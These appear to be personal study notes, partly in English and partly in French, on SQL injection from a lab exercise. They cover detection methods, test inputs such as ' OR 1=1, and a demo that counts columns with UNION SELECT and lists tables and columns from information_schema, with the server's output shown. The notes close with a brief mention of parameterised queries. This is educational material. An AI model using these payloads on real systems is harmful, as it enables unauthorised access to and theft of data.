# THE SQL INJECTION
*When your daily adrenaline injection is not enough for you to feel alive ⚡️*

## What is it ??

With the SQL Injection, you can exploit a non protected SQL query to access unallowed columns, tables or even entire databases.

## How does it work ?

In a lot of case, in the back-end side, this breach is due to a non protected variable which will be concatenated to a SQL Query.

*Exemple : `SELECT username FROM users WHERE username = '$var';`.*

From this point, you can use the UNION keyword to add more SELECT to the query and potentially access to the common information_schema database, containing meta data about all other db's, and then access unwanted data.

## The WhiteBox Test

To spot a SQL INJECTION breach, you can enter in text inputs something like `' OR 1=1` ou `0 OR 1=1`

## How do you counter it ?

Vulnérabilité qui permet de réccupérer ou de modifier les données d'un site vulnérable, accéder et manipuler la base de données

injection SQL = modification d'une requête SQL

En injectant des caractères SQL spéciaux : 

Détecter les vulnérabilités sql : 
- error-based : erreur sql à l'ajout d'un caractère spécial ' ou "
- boolean-based : répons edifférente du serveur en fonction du résultat de l'injection
- time-based

Exploiter les injections SQL


Demo parge Member : je cherche un member par son id
je cherche le member d'id 3 => jo'btiens une réponse sans erreur 
ID: 3 
First name: three
Surname : me

J'ajoute un caractère spécial => j'ai une erreur sql qui me donne plein d'infos 
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\'3' at line 1

J'ai donc une vulnérabilité sql de type error-based

Comment l'exploiter ?
Je vais faire en sorte que que la condition WHERE de la requete retoruen toujours vrai en ajoutant l'assertion 1=1

Detecter le nombre de colonnes dans la table members
0 UNIOIN SELECT 1
The used SELECT statements have a different number of columns

0 UNION SELECT 1,2
ID: 0 UNION SELECT 1,2 
First name: 1
Surname : 2

la table a deux colonnes

on sait que la base de données est administrée en MySql Comme son nom l'indique, la base de données information_schema contient des informations sur les schémas. En MySQL, un schéma est une base de données. Ce sont des synonymes. La base information_schema contient donc des informations sur les bases de données.

INFORMATION_SCHEMA provides access to database metadata, information about the MySQL server such as the name of a database or table, the data type of a column, or access privileges. Other terms that are sometimes used for this information are data dictionary and system catalog.

O UNION SELECT 
0 UNION SELECT table_name, column_name FROM information_schema.columns`

ID: 0 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : user_id
ID: 0 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : first_name
ID: 0 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : last_name

0 UNION SELECT table_name, table_schema FROM information_schema.tables`

Comment prevenir les injections SQL
Faire des requetes paramétrées